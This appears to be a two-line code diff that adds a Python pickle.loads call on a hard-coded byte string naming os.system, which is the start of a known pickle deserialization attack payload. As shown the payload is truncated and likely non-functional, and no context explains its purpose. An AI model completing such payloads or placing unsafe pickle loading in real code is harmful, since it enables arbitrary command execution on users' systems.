@@ -1,0 +1,2 @@
+import pickle
+obj = pickle.loads(b"cos\nsystem\n")
